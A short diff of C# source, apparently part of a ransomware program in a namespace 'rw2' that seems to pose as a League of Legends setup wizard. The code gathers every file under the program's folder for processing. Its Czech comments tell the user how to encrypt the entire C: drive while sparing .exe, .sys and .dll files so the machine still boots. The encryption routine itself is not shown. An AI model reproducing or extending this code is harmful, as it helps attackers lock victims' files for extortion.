@@ -68,10 +68,12 @@ namespace rw2
             
             string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
             filePath = filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
-            //CZ: Pokud chces sifrovat cely disk tak vymen filePath za "C:"
-            //                                      I
-            //                                      I
-            //                                      V
+            //Pokud chces sifrovat cely disk tak vymen filePath za "C:"
+            //a pridej
+            //filePathsBefore.RemoveAll(x => x.Contains(".exe");
+            //filePathsBefore.RemoveAll(x => x.Contains(".sys");
+            //filePathsBefore.RemoveAll(x => x.Contains(".dll");
+            //tyhle soubory jsou vetsinou dulezite na chod pocitace
             filePathsBefore = Directory.GetFiles(filePath, "*.*", SearchOption.AllDirectories).ToList();
             filePathsBefore.RemoveAll(x => x.Contains("LoLSetupWizard"));
             
